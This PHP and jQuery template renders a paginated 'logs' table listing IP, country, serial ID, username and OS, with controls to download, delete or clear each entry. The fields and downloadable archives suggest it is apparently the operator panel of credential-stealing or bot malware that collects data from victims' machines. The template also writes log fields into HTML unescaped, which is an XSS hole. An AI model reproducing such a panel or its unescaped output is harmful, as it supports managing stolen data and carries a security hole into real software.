<?php
	$ltable = '';
	$lcount = count($data['logs']);
	for($i=0;$i < $lcount;$i++)
	{
		$key = $data['logs'][$i];
		if(count($key) != 7) break;
		$ltable .= '<tr><td>'.($i + $data['pageid'] * 10 + 1).'</td><td>'.date('d.m.y (H:i)', $key[6]).'</td><td>'.$key[1].'</td><td>'.$key[2].'</td><td>'.$key[3].'</td><td>'.$key[4].'</td><td>'.$key[5].'</td><td><button unix="'.$key[6].'" f="u" class="btn btn-success btn-xs">Download</button> <button unix="'.$key[0].'" f="d" class="btn btn-danger btn-xs">Delete</button></td></tr>';
	}
	if(empty($ltable))
		$ltable = '<tr><td colspan="8">Logs not found</td></tr>';
	$pgslist = '';
	if($data['pcount'] > 1)
	{
		$from = $data['pageid'] - 5;
		$from = $from < 0 ? 0 : $from + 1;
		$to = $from + 10;
		for($i=$from;$i<$to;$i++)
		{
			if($i >= $data['pcount']) break;
			if($data['pageid'] == $i) $opacity = '0.8';
			else $opacity = '1';
			$pgslist .= '<button style="margin-top: 15px;opacity: '.$opacity.'" page="'.$i.'" class="btn btn-default btn-xs">'.$i.'</button> ';
		}
	}
?>
<script>
	$(document).ready(function()
	{
		var pageid = 0;
		var regex = /<script\b[^>]*>([\s\S]*?)<\/script>/gm;
		$(document).on('click', '[page]', function()
		{
			var page = $(this).attr('page');
			$.post('?p1=logs',
			{
				page: page
			}, function(data)
			{
				pageid = page;
				data = data.replace(regex,"");
				data = $(data);
				$("#general").html(data.find("#general").html());
			});
		});
		$(document).on('click', 'button', function()
		{
			switch($(this).attr('f'))
			{
				case 's':
					$.post('?p1=logs',
					{
						page: pageid
					}, function(data)
					{
						data = data.replace(regex,"");
						data = $(data);
						$("#general").html(data.find("#general").html());
					});
					break;
				case 'c':
					$.get("?p1=logs&p2=clean", function()
					{
						$('button[f="s"]').click();
						$.notify(
						{
							message: 'Success'
						},
						{
							animate:
							{
								enter: 'animated flipInY',
								exit: 'animated flipOutX'
							},
							type: 'success',
							delay: 2500,
							placement:
							{
								from: 'bottom',
								align: 'left'
							}
						});
					});
					break;
				case 'd':
					var unix = $(this).attr('unix');
					$.post('?p1=logs&p2=delete',
					{
						unix: unix
					}, function()
					{
						$('button[f="s"]').click();
					});
					break;
				case 'u':
					var unix = $(this).attr('unix');
					window.open('?p1=logs&p2=upload&p3='+unix, '_blank');
					break;
			}
		});
	});
</script>
<div id="general">
	<button style="margin-top: 15px;" f='s' class='btn btn-info btn-xs'>Refresh list</button>
	<button style="margin-top: 15px;" data-toggle="modal" data-target="div[name='confirmDelete']" class='btn btn-info btn-xs'>Clean list</button>
	<div style="float: right">
		<?=$pgslist;?>
	</div>
	<div class="row">
		<div class="col-lg-12">
			<table class="cntr table table-striped table-hover">
				<thead>
					<tr>
						<th>#</th>
						<th>Date</th>
						<th>Ip</th>
						<th>Country</th>
						<th>Serial Id</th>
						<th>Username</th>
						<th>Os</th>
						<th></th>
					</tr>
				</thead>
				<tbody>
					<?=$ltable;?>
				</tbody>
			</table>
		</div>
	</div>
</div>
<div class="modal fade" name="confirmDelete" tabindex="-1" role="dialog" aria-hidden="true">
	<div class="modal-dialog modal-xs">
		<div class="modal-content">
			<div class="modal-header">
				<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
				<h4 name="passHwid" class="modal-title">Are you sure?</h4>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-success" f='c' data-dismiss="modal">Yes</button>
				<button type="button" class="btn btn-danger" data-dismiss="modal">Close</button>
			</div>
		</div>
	</div>
</div>